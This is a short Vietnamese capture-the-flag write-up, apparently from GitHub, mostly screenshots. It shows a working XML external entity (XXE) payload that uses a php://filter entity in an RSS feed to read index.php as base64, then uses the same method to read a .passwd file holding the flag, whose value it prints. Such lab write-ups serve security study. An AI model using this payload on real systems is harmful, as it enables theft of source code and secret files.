![image](https://github.com/user-attachments/assets/edd187e0-ff5e-4c17-b5b6-76b1b76c7a4d)![image](https://github.com/user-attachments/assets/15dab2ad-a314-4373-9e83-c7401a2bc889)

![image](https://github.com/user-attachments/assets/c45657ab-4df8-4f7d-9f91-c3a76b670d3f)

Sau khi thử khác nhiều payload thì kết luận cái placehold không chỉ để trưng =))

Phải dùng  
```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE rss [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php"> 
]>
<rss version="2.0">

<channel>
  <title>W3Schools Home Page</title>
  <link>https://www.w3schools.com</link>
  <description>Free web building tutorials</description>
  <item>
    <title>&xxe;</title>
    <link>https://www.w3schools.com/xml/xml_rss.asp</link>
    <description>New RSS tutorial on W3Schools</description>
  </item>
  <item>
    <title>XML Tutorial</title>
    <link>https://www.w3schools.com/xml</link>
    <description>New XML tutorial on W3Schools</description>
  </item>
</channel>

</rss>
```
![image](https://github.com/user-attachments/assets/b2e622a5-188e-43ec-a0f0-205ae0f0f9ad)

![image](https://github.com/user-attachments/assets/3bd8516c-7db0-4233-897f-65163fc43d4e)

Giờ chỉ cần base64-decode là ta có thể đọc tệp index.php

![image](https://github.com/user-attachments/assets/d135ca2e-9e83-4b18-bd82-a7c5eb9fa31c)

![image](https://github.com/user-attachments/assets/a391d425-e0e2-4736-8d16-60b966c0d715)

=> flag ở trong file .passwd

Ta chỉ cần đọc file .passwd nữa là xong

![image](https://github.com/user-attachments/assets/d76dafdd-48c1-460c-bee2-09f24c390bf1)

![image](https://github.com/user-attachments/assets/9a857e5f-2bee-4da7-9992-b460834b972a)

![image](https://github.com/user-attachments/assets/f901bb1e-28a9-46f7-8296-8544a575828e)

=> c934fed17f1cac3045ddfeca34f332bc
